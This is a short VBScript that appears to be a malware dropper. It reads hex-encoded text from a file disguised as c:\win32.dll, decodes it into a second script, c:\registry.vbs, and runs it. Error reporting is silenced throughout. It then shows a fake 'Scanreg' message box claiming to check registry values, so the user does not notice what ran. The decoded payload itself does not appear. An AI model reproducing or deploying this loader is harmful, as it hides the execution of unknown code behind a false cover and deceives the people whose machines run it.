on error resume next
dim e, y, z, data
Set fso = CreateObject("Scripting.FileSystemObject")
set hopenh = fso.openTextFile("c:\win32.dll", 1)
e = hopenh.readall
For y = 1 to Len(e) Step 2
z = z & Chr("&h" + Mid(e, y, 2))
next
Set fso = CreateObject("Scripting.FileSystemObject")
set h = fso.CreateTextFile("c:\registry.vbs", True)
h.Write z
h.Close
Set fsa = CreateObject("Wscript.Shell")
fsa.Run("c:\registry.vbs")
msgbox "Checking registry values", ,"Scanreg"
